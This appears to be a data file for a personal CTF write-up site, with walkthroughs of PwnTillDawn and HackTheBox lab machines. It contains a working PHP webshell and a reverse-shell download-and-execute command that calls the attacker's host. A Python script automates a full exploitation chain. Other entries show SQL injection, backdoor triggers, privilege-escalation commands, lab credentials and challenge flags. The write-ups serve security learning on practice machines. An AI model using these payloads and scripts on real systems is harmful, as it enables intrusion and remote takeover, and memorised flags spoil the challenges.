export type ContentBlock =
  | { type: 'text'; value: string }
  | { type: 'heading'; value: string }
  | { type: 'code'; language: string; value: string }
  | { type: 'flag'; value: string }
  | { type: 'image'; src: string; alt: string }
  | { type: 'info'; items: { label: string; value: string }[] }
  | { type: 'callout'; variant: 'note' | 'tip' | 'warning'; value: string };

export interface Writeup {
  slug: string;
  title: string;
  ctfName: string;
  category: 'web' | 'crypto' | 'pwn' | 'forensics' | 'reverse' | 'misc';
  difficulty: 'easy' | 'medium' | 'hard';
  date: string;
  description: string;
  tags: string[];
  externalUrl?: string;
  content: ContentBlock[];
}

export const categoryColors: Record<Writeup['category'], string> = {
  web: 'text-neon-green border-neon-green/30 bg-neon-green/10',
  crypto: 'text-muted-cyan border-muted-cyan/30 bg-muted-cyan/10',
  pwn: 'text-red-400 border-red-400/30 bg-red-400/10',
  forensics: 'text-amber-400 border-amber-400/30 bg-amber-400/10',
  reverse: 'text-purple-400 border-purple-400/30 bg-purple-400/10',
  misc: 'text-dimmed border-card-border bg-overlay/5',
};

export const difficultyColors: Record<Writeup['difficulty'], string> = {
  easy: 'text-green-400',
  medium: 'text-amber-400',
  hard: 'text-red-400',
};

export const writeups: Writeup[] = [
  // ─── PWNTILLDAWN ───────────────────────────────────────
  {
    slug: 'pwndrive',
    title: 'PwnDrive',
    ctfName: 'PwnTillDawn',
    category: 'web',
    difficulty: 'medium',
    date: '2024-11-26',
    description:
      'Exploiting a PHP-based file storage application on a Windows Server through unauthenticated admin user creation, arbitrary file upload, and a PHP webshell to achieve remote code execution with SYSTEM privileges.',
    tags: ['PHP', 'file-upload', 'webshell', 'Windows', 'RCE'],
    content: [
      {
        type: 'info',
        items: [
          { label: 'Platform', value: 'PwnTillDawn' },
          { label: 'OS', value: 'Windows Server 2008 R2' },
          { label: 'Target IP', value: '10.150.150.11' },
          { label: 'Difficulty', value: 'Medium' },
        ],
      },
      { type: 'heading', value: 'Reconnaissance' },
      {
        type: 'text',
        value:
          'Starting with a network sweep to identify live hosts, followed by a comprehensive service enumeration scan against the target.',
      },
      {
        type: 'code',
        language: 'bash',
        value: 'nmap -sn 10.150.150.10-10.150.150.254\nnmap 10.150.150.11 -sCV -oN scan.nmap',
      },
      {
        type: 'text',
        value:
          'The scan revealed a rich attack surface: FTP (Xlight 3.9), HTTP/HTTPS (Apache 2.4.46 with PHP 7.4.9), SMB (Windows Server 2008 R2), MSSQL (SQL Server 2012), MySQL (MariaDB 10.4.14), and RDP. The HTTP title "PwnDrive - Your Personal Online Storage" indicated a web-based file management application.',
      },
      { type: 'heading', value: 'Service Enumeration' },
      {
        type: 'text',
        value:
          'FTP and SMB were tested for anonymous access — both denied. The web application on port 80 became the primary target. Directory enumeration revealed several interesting endpoints.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'admin/     [301] — Admin panel\nupload/    [301] — File upload directory\nimg/       [301] — Image assets\ncomponents/[301] — Application components\nutils/     [301] — Utility scripts',
      },
      { type: 'heading', value: 'Unauthenticated Admin Creation' },
      {
        type: 'text',
        value:
          'Navigating to the /admin directory exposed an admin panel. Critically, the addedituser.php endpoint allowed creating users with arbitrary roles — including admin — without requiring authentication.',
      },
      { type: 'image', src: '/writeups/pwndrive/01.png', alt: 'Admin panel directory listing' },
      { type: 'image', src: '/writeups/pwndrive/02.png', alt: 'Unauthenticated user creation form' },
      {
        type: 'text',
        value:
          'After creating an admin account, I logged in and was presented with a file upload interface.',
      },
      { type: 'image', src: '/writeups/pwndrive/03.png', alt: 'File upload interface after admin login' },
      { type: 'heading', value: 'Exploitation — PHP Webshell Upload' },
      {
        type: 'text',
        value:
          'The file upload functionality had no restrictions on file type. I crafted a minimal PHP webshell that accepts system commands via a GET parameter.',
      },
      {
        type: 'code',
        language: 'php',
        value: '<html>\n<body>\n<form method="GET" name="<?php echo basename($_SERVER[\'PHP_SELF\']); ?>">\n<input type="TEXT" name="cmd" autofocus id="cmd" size="80">\n<input type="SUBMIT" value="Execute">\n</form>\n<pre>\n<?php\nif(isset($_GET[\'cmd\'])) {\n    system($_GET[\'cmd\'] . \' 2>&1\');\n}\n?>\n</pre>\n</body>\n</html>',
      },
      {
        type: 'text',
        value:
          'After uploading the webshell, I navigated to the /upload directory and accessed it directly, confirming arbitrary command execution on the target.',
      },
      { type: 'image', src: '/writeups/pwndrive/04.png', alt: 'Webshell accessible in upload directory' },
      { type: 'image', src: '/writeups/pwndrive/05.png', alt: 'Confirmed code execution via webshell' },
      { type: 'heading', value: 'Reverse Shell & Privilege Confirmation' },
      {
        type: 'text',
        value:
          'With code execution confirmed and running under SYSTEM privileges, I generated a reverse shell payload, hosted it on a local HTTP server, and triggered download + execution via the webshell.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '# Generate payload\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.66.66.78 LPORT=9999 -f exe -o reverse.exe\n\n# Host the payload\npython3 -m http.server 8000\n\n# Execute via webshell\npowershell -c "(New-Object Net.WebClient).DownloadFile(\'http://10.66.66.78:8000/reverse.exe\', \'reverse.exe\'); .\\reverse.exe"',
      },
      {
        type: 'text',
        value:
          'The reverse shell connected back with SYSTEM-level access. The flag was retrieved from C:\\Users\\Administrator\\Desktop\\.',
      },
      {
        type: 'callout',
        variant: 'note',
        value:
          'This machine is also vulnerable to EternalBlue (MS17-010) due to the Windows Server 2008 R2 SP1 target. An automated exploitation script was written to chain the entire attack — from user creation to file upload to reverse shell — using Python requests.',
      },
      { type: 'heading', value: 'Automated Exploitation Script' },
      {
        type: 'text',
        value:
          'I developed a Python script to automate the full exploitation chain: creating an admin user, logging in, uploading the webshell, generating a msfvenom payload, and triggering the reverse shell.',
      },
      {
        type: 'code',
        language: 'python',
        value: 'import os, subprocess, threading, requests\nfrom http.server import HTTPServer, SimpleHTTPRequestHandler\n\ndef start_http_server(directory, port):\n    os.chdir(directory)\n    httpd = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)\n    httpd.serve_forever()\n\ndef create_payload(output_path, lhost, lport):\n    subprocess.run(["msfvenom", "-p", "windows/x64/shell_reverse_tcp",\n        f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", output_path], check=True)\n\ndef main():\n    url = input("Enter target URL: ").strip()\n    # 1. Create admin user via unauthenticated endpoint\n    signup_data = {"username": "newuser", "password": "newuser", "role": "admin"}\n    requests.post(url + "/admin/addedituser.php", data=signup_data)\n    # 2. Login\n    session = requests.Session()\n    session.post(url + "/login.php", data={"username": "newuser", "password": "newuser"})\n    # 3. Upload webshell\n    with open("/opt/webshellcmd.php", "rb") as f:\n        requests.post(url + "/uploadfile.php",\n            data={"currentfolder": r"C:\\xampp\\htdocs/upload/11/"},\n            files={"newfile": ("webshellcmd.php", f, "application/octet-stream")})\n    # 4. Generate payload + trigger reverse shell\n    threading.Thread(target=start_http_server, args=(".", 8000), daemon=True).start()\n    create_payload("reverse.exe", "10.66.66.78", "9999")\n    requests.get(f"{url}/upload/11/webshellcmd.php?cmd=powershell -c \\"(New-Object Net.WebClient).DownloadFile(\'http://10.66.66.78:8000/reverse.exe\', \'reverse.exe\'); .\\\\reverse.exe\\"")\n\nif __name__ == "__main__":\n    main()',
      },
    ],
  },
  {
    slug: 'ports',
    title: 'Ports',
    ctfName: 'PwnTillDawn',
    category: 'pwn',
    difficulty: 'easy',
    date: '2024-11-26',
    description:
      'Exploiting the infamous vsftpd 2.3.4 supply-chain backdoor — a compromised FTP daemon that opens a root shell on port 6200 when triggered by a specially crafted username.',
    tags: ['vsftpd', 'backdoor', 'supply-chain', 'Linux', 'FTP'],
    content: [
      {
        type: 'info',
        items: [
          { label: 'Platform', value: 'PwnTillDawn' },
          { label: 'OS', value: 'Ubuntu Linux' },
          { label: 'Target IP', value: '10.150.150.12' },
          { label: 'Difficulty', value: 'Easy' },
        ],
      },
      { type: 'heading', value: 'Reconnaissance' },
      {
        type: 'text',
        value: 'An initial service scan revealed only two open ports on the target.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.0.8 or later\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu',
      },
      {
        type: 'text',
        value:
          'FTP allowed anonymous login, but the server contained no files. The FTP banner revealed the actual version: vsFTPd 2.3.4 — a version known for containing a supply-chain backdoor.',
      },
      { type: 'heading', value: 'Vulnerability Analysis — vsftpd 2.3.4 Backdoor' },
      {
        type: 'text',
        value:
          'In July 2011, the official vsftpd 2.3.4 source tarball was compromised on the project\'s master download site. An attacker injected a malicious backdoor into the source code before distribution. Anyone who compiled and deployed this version unknowingly installed a trojaned FTP server.',
      },
      {
        type: 'text',
        value:
          'The backdoor triggers when a username ending with ":)" is sent during authentication. The password field accepts any value. Once triggered, the server spawns /bin/sh bound to port 6200 with the same privileges as the FTP daemon — typically root.',
      },
      { type: 'heading', value: 'Exploitation' },
      {
        type: 'text',
        value: 'The exploitation is straightforward — connect to the FTP service and send a username with the backdoor trigger string.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '# Terminal 1: Trigger the backdoor\n$ nc 10.150.150.12 21\n220 Through the portal... - into nothingness or bliss?\nUSER hello:)\n331 Please specify the password.\nPASS whatever',
      },
      {
        type: 'code',
        language: 'bash',
        value: '# Terminal 2: Connect to the spawned shell\n$ nc 10.150.150.12 6200\nid\nuid=0(root) gid=0(root) groups=0(root)',
      },
      {
        type: 'flag',
        value: '5ee499eb5d0b8e4269b13483e57adaa0b3815f48',
      },
      { type: 'heading', value: 'Technical Deep-Dive' },
      {
        type: 'text',
        value:
          'The malicious code was embedded in the USER command handler. When the server parsed a username ending with ":)", it would fork a child process, bind /bin/sh to TCP port 6200, and accept connections without any authentication. Since vsftpd typically runs as root, the spawned shell inherits root privileges.',
      },
      {
        type: 'callout',
        variant: 'tip',
        value:
          'This is a textbook supply-chain attack. The vulnerability existed not because of a coding flaw, but because the distribution infrastructure was compromised. It highlights the importance of verifying software integrity via checksums and signatures.',
      },
    ],
  },
  {
    slug: 'snare',
    title: 'Snare',
    ctfName: 'PwnTillDawn',
    category: 'web',
    difficulty: 'medium',
    date: '2024-12-05',
    description:
      'Leveraging a Local File Inclusion vulnerability to achieve Remote File Inclusion, obtaining a reverse shell via PHP, then escalating to root by manipulating the shadow file.',
    tags: ['LFI', 'RFI', 'PHP', 'reverse-shell', 'privilege-escalation', 'Linux'],
    content: [
      {
        type: 'info',
        items: [
          { label: 'Platform', value: 'PwnTillDawn' },
          { label: 'OS', value: 'Ubuntu Linux' },
          { label: 'Target IP', value: '10.150.150.18' },
          { label: 'Difficulty', value: 'Medium' },
        ],
      },
      { type: 'heading', value: 'Reconnaissance' },
      {
        type: 'text',
        value: 'The initial scan identified two services: SSH on port 22 and an Apache web server on port 80.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
      },
      { type: 'heading', value: 'Web Application Analysis' },
      {
        type: 'text',
        value:
          'The web application\'s URL structure immediately stood out: /index.php?page=home. This pattern — where a page parameter dynamically includes content — is a classic indicator of potential file inclusion vulnerabilities.',
      },
      {
        type: 'text',
        value:
          'Multiple enumeration tools (Gobuster, ffuf, DNS brute-forcing) returned no additional endpoints. The focus shifted to testing the page parameter for file inclusion.',
      },
      { type: 'heading', value: 'Identifying the File Inclusion' },
      {
        type: 'text',
        value:
          'Attempting to include /etc/passwd returned a blank page with a 200 status code — rather than a 404. This behavior suggested the server was processing the inclusion but either filtering the output or wrapping the path. Standard path traversal (../../etc/passwd) did not succeed, indicating some input sanitization was in place.',
      },
      { type: 'heading', value: 'Exploitation — Remote File Inclusion' },
      {
        type: 'text',
        value:
          'Since local file inclusion was restricted, I pivoted to testing for Remote File Inclusion (RFI). I prepared the pentestmonkey PHP reverse shell, configured the callback IP and port, and hosted it on a Python HTTP server. When the page parameter was set to load the remote shell, the HTTP server received the request and the connection dropped — indicating successful execution.',
      },
      { type: 'image', src: '/writeups/snare/01.png', alt: 'Remote file inclusion triggering the reverse shell' },
      { type: 'heading', value: 'Initial Foothold' },
      {
        type: 'text',
        value:
          'The reverse shell connected back as the www-data user. The first flag was located in the home directory. I then stabilized the shell for further enumeration.',
      },
      { type: 'image', src: '/writeups/snare/02.png', alt: 'Initial shell access and first flag' },
      { type: 'heading', value: 'Privilege Escalation' },
      {
        type: 'text',
        value:
          'sudo -l returned no results, and neither the www-data nor the snare user password was known. After manual enumeration of key system files, a critical misconfiguration was discovered: /etc/shadow was readable and writable by the www-data user.',
      },
      {
        type: 'text',
        value:
          'By removing the root password hash from /etc/shadow (leaving the field empty), the root account was left with no password. Running su root then granted full root access without requiring credentials.',
      },
      { type: 'image', src: '/writeups/snare/03.png', alt: 'Successful root privilege escalation' },
      {
        type: 'callout',
        variant: 'warning',
        value:
          'Writable /etc/shadow by a web server user is a severe misconfiguration. In real-world environments, this file should only be accessible by root (permissions 640 with root:shadow ownership).',
      },
    ],
  },

  // ─── HACKTHEBOX ────────────────────────────────────────
  {
    slug: 'swagshop',
    title: 'SwagShop',
    ctfName: 'HackTheBox',
    category: 'web',
    difficulty: 'medium',
    date: '2025-01-02',
    description:
      'Compromising a Magento 1.x e-commerce platform through SQL injection to create an admin account, then leveraging a post-authentication PHP Object Injection vulnerability for RCE, and escalating via a misconfigured sudo rule on vi.',
    tags: ['Magento', 'SQLi', 'deserialization', 'sudo', 'privesc', 'Linux'],
    content: [
      {
        type: 'info',
        items: [
          { label: 'Platform', value: 'HackTheBox' },
          { label: 'OS', value: 'Ubuntu Linux' },
          { label: 'Target IP', value: '10.129.229.138' },
          { label: 'Difficulty', value: 'Medium' },
        ],
      },
      { type: 'heading', value: 'Reconnaissance' },
      {
        type: 'text',
        value: 'Port scanning revealed SSH and HTTP services. The HTTP server redirected to swagshop.htb, which was added to /etc/hosts.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n                     Redirect → http://swagshop.htb/',
      },
      { type: 'image', src: '/writeups/swagshop/01.png', alt: 'Adding swagshop.htb to /etc/hosts' },
      { type: 'heading', value: 'Web Application Analysis' },
      {
        type: 'text',
        value:
          'The application turned out to be a Magento CMS instance — an e-commerce platform similar to WordPress. The storefront displayed HTB-branded merchandise with full shopping functionality including user registration and cart management.',
      },
      { type: 'image', src: '/writeups/swagshop/02.png', alt: 'Magento storefront displaying HTB merchandise' },
      { type: 'image', src: '/writeups/swagshop/03.png', alt: 'User account registration page' },
      {
        type: 'text',
        value:
          'A Nikto scan confirmed the CMS identity and revealed several exposed directories including /app, /includes, /lib, /var, and the presence of install.php. Using MageScan — a dedicated Magento security scanner — the exact version was identified as Magento Community Edition 1.9.0.0/1.9.0.1.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'Magento Information\n+-----------+------------------+\n| Parameter | Value            |\n+-----------+------------------+\n| Edition   | Community        |\n| Version   | 1.9.0.0, 1.9.0.1 |\n+-----------+------------------+',
      },
      { type: 'heading', value: 'Sensitive File Discovery' },
      {
        type: 'text',
        value:
          'MageScan flagged app/etc/local.xml as accessible — a configuration file that exposes database credentials.',
      },
      { type: 'image', src: '/writeups/swagshop/05.png', alt: 'Database credentials exposed in local.xml' },
      {
        type: 'code',
        language: 'xml',
        value: '<username>root</username>\n<password>fMVWh7bDHpgZkyfqQXreTjU9</password>\n<dbname>swagshop</dbname>',
      },
      { type: 'heading', value: 'Initial Access — SQL Injection Admin Creation' },
      {
        type: 'text',
        value:
          'Searchsploit revealed a pre-authentication SQL injection vulnerability in the Magento admin CMS Wysiwyg directive handler. The exploit injects SQL to create an admin account directly in the database.',
      },
      {
        type: 'code',
        language: 'python',
        value: '# Exploit crafts a malicious base64-encoded SQL payload targeting:\n# POST /index.php/admin/Cms_Wysiwyg/directive/index/\n#\n# The injected SQL:\nSET @SALT = \'rp\';\nSET @PASS = CONCAT(MD5(CONCAT(@SALT, \'{password}\')), CONCAT(\':\', @SALT));\nINSERT INTO admin_user (...) VALUES (\'Firstname\',\'Lastname\',\'email@example.com\',\'{username}\',@PASS,...);\nINSERT INTO admin_role (...) VALUES (1,2,0,\'U\',(SELECT user_id FROM admin_user WHERE username = \'{username}\'),\'Firstname\');',
      },
      {
        type: 'text',
        value: 'After running the exploit, admin credentials ypwq:123 were created and verified by logging into /index.php/admin.',
      },
      { type: 'image', src: '/writeups/swagshop/06.png', alt: 'SQL injection exploit creating admin account' },
      { type: 'image', src: '/writeups/swagshop/08.png', alt: 'Successfully logged into Magento admin panel' },
      { type: 'heading', value: 'Remote Code Execution — PHP Object Injection' },
      {
        type: 'text',
        value:
          'With admin access, a post-authentication RCE exploit (Magento CE < 1.9.0.1 PHP Object Injection) was used. The exploit leverages a Zend Framework deserialization vulnerability through a POP chain that pivots into call_user_func, executing arbitrary system commands.',
      },
      {
        type: 'text',
        value:
          'The original exploit used the mechanize library, which proved unreliable. I rewrote the exploit using the requests library for better session handling and reliability.',
      },
      { type: 'image', src: '/writeups/swagshop/10.png', alt: 'Reverse shell connection established' },
      { type: 'heading', value: 'Privilege Escalation — Sudo vi' },
      {
        type: 'text',
        value:
          'After stabilizing the shell, sudo -l revealed the www-data user could run vi with root privileges. Breaking out of vi into a shell is a well-documented GTFOBins technique.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '$ sudo -l\n# (root) NOPASSWD: /usr/bin/vi\n\n$ sudo /usr/bin/vi\n:!/bin/bash\n# whoami → root',
      },
      { type: 'image', src: '/writeups/swagshop/12.png', alt: 'Root access achieved via vi escape' },
      {
        type: 'flag',
        value: 'user: 0921457444fa484da43aa98002af9e76 | root: 3c40f240d91c144117a633111d876652',
      },
    ],
  },
  {
    slug: 'usage',
    title: 'Usage',
    ctfName: 'HackTheBox',
    category: 'web',
    difficulty: 'medium',
    date: '2025-01-15',
    description:
      'Exploiting a blind SQL injection in a password reset form to extract admin credentials, leveraging a file upload bypass for initial shell access, and abusing a wildcard vulnerability in a 7z backup binary for privilege escalation via symlink attack.',
    tags: ['SQLi', 'file-upload', 'wildcard', 'symlink', '7z', 'privesc', 'Linux'],
    content: [
      {
        type: 'info',
        items: [
          { label: 'Platform', value: 'HackTheBox' },
          { label: 'OS', value: 'Ubuntu Linux' },
          { label: 'Target', value: 'usage.htb' },
          { label: 'Difficulty', value: 'Medium' },
        ],
      },
      { type: 'heading', value: 'Reconnaissance' },
      {
        type: 'text',
        value:
          'The application featured standard login and registration forms. The login form was not vulnerable to SQL injection. After creating an account, the focus shifted to the password reset functionality.',
      },
      { type: 'heading', value: 'SQL Injection — Password Reset Form' },
      {
        type: 'text',
        value:
          'The forgot-password endpoint accepted an email parameter via POST. Injecting a single quote caused a 500 Internal Server Error, confirming the parameter was vulnerable to SQL injection.',
      },
      {
        type: 'code',
        language: 'http',
        value: 'POST /forget-password HTTP/1.1\nHost: usage.htb\nContent-Type: application/x-www-form-urlencoded\n\n_token=...&email=sparky%40home.com\'',
      },
      {
        type: 'text',
        value: 'SQLMap was used to enumerate the backend database through the blind injection point.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '# Enumerate databases\nsqlmap -r usage.req -p email --batch --level 3 --dbs\n\n# Dump admin_users table from usage_blog database\nsqlmap -r usage.req -p email --level 5 --risk 3 --technique=B \\\n  -D usage_blog -T admin_users --dump --batch --threads 10',
      },
      { type: 'image', src: '/writeups/usage/01.png', alt: 'SQLMap extracting admin credentials from database' },
      { type: 'heading', value: 'Cracking the Admin Hash' },
      {
        type: 'text',
        value:
          'The extracted hash was identified as bcrypt. Using Hashcat, the password was successfully recovered.',
      },
      {
        type: 'code',
        language: 'bash',
        value: 'hashcat --help | grep bcrypt\n# Mode 3200 — bcrypt $2*$\n\n# Cracked: admin:whatever1',
      },
      { type: 'image', src: '/writeups/usage/02.png', alt: 'Hashcat successfully cracking the bcrypt hash' },
      { type: 'heading', value: 'File Upload Bypass — Initial Shell' },
      {
        type: 'text',
        value:
          'The admin panel contained an image upload feature. PHP files were permitted — a critical oversight. By uploading a reverse shell with the filename shell.jpg.php, the upload filter was bypassed. Accessing the uploaded file triggered the reverse shell.',
      },
      { type: 'image', src: '/writeups/usage/03.png', alt: 'Uploading PHP webshell disguised as image' },
      { type: 'image', src: '/writeups/usage/04.png', alt: 'Shell access obtained on the target' },
      {
        type: 'flag',
        value: 'user.txt: b0ed2bd390c76bc294ffd963ccf20b9e',
      },
      { type: 'heading', value: 'Lateral Movement' },
      {
        type: 'text',
        value:
          'The .monitrc configuration file contained credentials for the user xander: admin:3nc0d3d_pa$$w0rd. These credentials allowed lateral movement via su to the xander account.',
      },
      { type: 'heading', value: 'Privilege Escalation — 7z Wildcard Symlink Attack' },
      {
        type: 'text',
        value:
          'sudo -l revealed that xander could execute /usr/bin/user_management as root. Analyzing the binary with strings showed it internally called 7z to compress files using a wildcard pattern.',
      },
      {
        type: 'text',
        value:
          'This is vulnerable to a symlink attack: by creating a symbolic link named root.txt pointing to /root/root.txt, the 7z compression operation would follow the symlink and include the target file\'s contents in the archive.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '# Create symlink pointing to root flag\ntouch @root\nln -s /root/root.txt root.txt\n\n# Run the privileged binary to trigger 7z compression\nsudo /usr/bin/user_management',
      },
      { type: 'image', src: '/writeups/usage/05.png', alt: 'Root flag obtained via symlink attack' },
      {
        type: 'flag',
        value: 'root.txt: 12230acd38ff54e91144bf7725082f75',
      },
    ],
  },
  {
    slug: 'wifinetic',
    title: 'Wifinetic',
    ctfName: 'HackTheBox',
    category: 'misc',
    difficulty: 'easy',
    date: '2025-01-20',
    description:
      'Enumerating an FTP server with anonymous access to retrieve OpenWrt backup files containing WiFi credentials, then escalating privileges through a WPS Pixie Dust attack using Reaver against an internal wireless interface.',
    tags: ['FTP', 'OpenWrt', 'WiFi', 'WPS', 'Reaver', 'Linux'],
    content: [
      {
        type: 'info',
        items: [
          { label: 'Platform', value: 'HackTheBox' },
          { label: 'OS', value: 'Ubuntu Linux' },
          { label: 'Target', value: 'wifinetic.htb' },
          { label: 'Difficulty', value: 'Easy' },
        ],
      },
      {
        type: 'callout',
        variant: 'tip',
        value:
          'The machine name often hints at the attack vector. "Wifinetic" points directly at wireless/WiFi-related exploitation.',
      },
      { type: 'heading', value: 'Reconnaissance' },
      {
        type: 'text',
        value: 'A full port scan followed by targeted service detection revealed three open ports.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3 (Anonymous login allowed)\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n53/tcp open  tcpwrapped',
      },
      { type: 'heading', value: 'FTP Enumeration' },
      {
        type: 'text',
        value:
          'Anonymous FTP access revealed several files including PDF documents, a migration guide, and critically — an OpenWrt configuration backup archive.',
      },
      {
        type: 'code',
        language: 'text',
        value: '-rw-r--r--  MigrateOpenWrt.txt\n-rw-r--r--  ProjectGreatMigration.pdf\n-rw-r--r--  ProjectOpenWRT.pdf\n-rw-r--r--  backup-OpenWrt-2023-07-26.tar   ← Target\n-rw-r--r--  employees_wellness.pdf',
      },
      { type: 'heading', value: 'Backup Analysis — Credential Extraction' },
      {
        type: 'text',
        value:
          'The OpenWrt backup tar archive contained a full /etc directory snapshot. Reviewing the PDF files revealed employee email addresses. Grepping the backup for passwords yielded a WiFi pre-shared key from /etc/config/wireless.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '$ grep -Ri pass etc/\netc/config/wireless: option key \'VeRyUniUqWiFIPasswrd1!\'',
      },
      {
        type: 'text',
        value:
          'Cross-referencing usernames from the passwd file with the recovered password, SSH access was obtained as the netadmin user.',
      },
      {
        type: 'flag',
        value: 'user.txt: bd8ed5ef635c3eb944b155cdfc41d777',
      },
      { type: 'heading', value: 'Privilege Escalation — WPS Reaver Attack' },
      {
        type: 'text',
        value:
          'Running LinPEAS revealed several interesting capabilities. Most notably, /usr/bin/reaver had cap_net_raw+ep — a WiFi brute-forcing tool with raw network access capabilities.',
      },
      { type: 'image', src: '/writeups/wifinetic/01.png', alt: 'Reaver binary with cap_net_raw+ep capability' },
      {
        type: 'text',
        value:
          'Enumerating wireless interfaces with iw dev showed a monitor-mode interface (mon0) and a managed interface (wlan2). Scanning for networks with iwlist scan found an "OpenWrt" network protected by WPA2-PSK with WPS enabled.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'wlan1 Scan completed:\n  Cell 01 - Address: 02:00:00:00:00:00\n    ESSID: "OpenWrt"\n    Encryption: WPA2 Version 1\n    Authentication: PSK',
      },
      {
        type: 'text',
        value:
          'Using Reaver against the target BSSID with the monitor interface, the WPS PIN was brute-forced and the WPA password recovered.',
      },
      { type: 'image', src: '/writeups/wifinetic/02.png', alt: 'Reaver successfully recovering WPA password' },
      {
        type: 'text',
        value:
          'The recovered password (WhatIsRealAnDWhAtIsNot51121!) was used to authenticate as root via SSH.',
      },
      { type: 'image', src: '/writeups/wifinetic/03.png', alt: 'Root access achieved via recovered WiFi password' },
      {
        type: 'flag',
        value: 'root.txt: 590bf4dbb84f1c1263fc6958c70b5eaf',
      },
      { type: 'heading', value: 'Understanding WPS Attacks' },
      {
        type: 'text',
        value:
          'WPS (WiFi Protected Setup) uses an 8-digit PIN for device authentication. The protocol\'s design weakness is that it validates the PIN in two halves: the first 4 digits are checked independently, and if correct, the remaining 3 digits are checked (the 8th digit is a checksum). This reduces the brute-force space from 10^8 (100 million) to approximately 10^4 + 10^3 (11,000) combinations — making it trivially brute-forceable.',
      },
    ],
  },
  {
    slug: 'cicada',
    title: 'Cicada',
    ctfName: 'HackTheBox',
    category: 'misc',
    difficulty: 'medium',
    date: '2024-10-21',
    description:
      'Compromising an Active Directory domain controller through systematic credential chaining — from an anonymous SMB share containing a default password, through RID brute-forcing, password spraying, and lateral movement, to privilege escalation via SeBackupPrivilege abuse and SAM dump.',
    tags: ['Active-Directory', 'SMB', 'Kerberos', 'credential-chaining', 'SeBackupPrivilege', 'Windows'],
    content: [
      {
        type: 'info',
        items: [
          { label: 'Platform', value: 'HackTheBox' },
          { label: 'OS', value: 'Windows Server 2022' },
          { label: 'Target', value: 'CICADA-DC.cicada.htb' },
          { label: 'Difficulty', value: 'Medium' },
        ],
      },
      { type: 'heading', value: 'Reconnaissance' },
      {
        type: 'text',
        value:
          'The scan revealed a full Active Directory domain controller stack: DNS (53), Kerberos (88), RPC (135), LDAP (389/636), SMB (445), WinRM (5985), and multiple RPC endpoints.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'Key Services:\n53/tcp   — Simple DNS Plus\n88/tcp   — Kerberos (cicada.htb)\n389/tcp  — LDAP (Domain: cicada.htb)\n445/tcp  — SMB\n5985/tcp — WinRM\n\nHost: CICADA-DC | Domain: cicada.htb',
      },
      { type: 'heading', value: 'Kerberos User Enumeration' },
      {
        type: 'text',
        value: 'Kerberos pre-authentication was used to enumerate valid domain principals.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '$ nmap --script krb5-enum-users --script-args krb5-enum-users.realm=\'cicada.htb\' -p 88 -Pn 10.10.11.35\n\nDiscovered Kerberos principals:\n  guest@cicada.htb\n  administrator@cicada.htb',
      },
      { type: 'heading', value: 'SMB Enumeration — Default Credentials' },
      {
        type: 'text',
        value:
          'Anonymous SMB listing showed several shares. The DEV share was access-denied, but the HR share was accessible. Inside it, a company notice revealed a default password for new hires.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'Shares: ADMIN$, C$, DEV, HR, IPC$, NETLOGON, SYSVOL\n\n$ smbclient //10.10.11.35/HR -N\nsmb: \\> get "Notice from HR.txt"\n\n─── Notice from HR.txt ───\nDear new hire!\nYour default password is: Cicada$M6Corpb*@Lp#nZp!8',
      },
      { type: 'heading', value: 'RID Brute-Force — User Discovery' },
      {
        type: 'text',
        value:
          'With the guest account and RID brute-forcing via NetExec, a complete list of domain users was enumerated.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '$ nxc smb 10.10.11.35 -u guest -p \'\' --rid-brute\n\nDomain Users:\n  Administrator, Guest, krbtgt, CICADA-DC$\n  john.smoulder, sarah.dantelia, michael.wrightson\n  david.orelious, emily.oscars',
      },
      { type: 'heading', value: 'Password Spraying' },
      {
        type: 'text',
        value:
          'Spraying the default password against all discovered users yielded a valid credential pair.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '$ nxc smb 10.10.11.35 -u users.txt -p \'Cicada$M6Corpb*@Lp#nZp!8\'\n\n[+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8',
      },
      { type: 'heading', value: 'Credential Chaining' },
      {
        type: 'text',
        value:
          'Using Michael\'s credentials with NetExec\'s --users flag to dump user descriptions revealed a second set of credentials — David had stored his password in his AD description field.',
      },
      {
        type: 'code',
        language: 'text',
        value: 'david.orelious  Description: Just in case I forget my password is aRt$Lp#7t*VQ!3',
      },
      {
        type: 'text',
        value:
          'David\'s credentials unlocked the DEV SMB share, which contained a PowerShell backup script with Emily\'s credentials hardcoded.',
      },
      {
        type: 'code',
        language: 'powershell',
        value: '$username = "emily.oscars"\n$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force',
      },
      { type: 'heading', value: 'Shell Access — Evil-WinRM' },
      {
        type: 'text',
        value: 'Emily\'s credentials worked with Evil-WinRM, providing interactive shell access to the domain controller.',
      },
      {
        type: 'code',
        language: 'bash',
        value: '$ evil-winrm -u emily.oscars -p \'Q!3@Lp#M6b*7t*Vt\' -i CICADA-DC.cicada.htb',
      },
      {
        type: 'text',
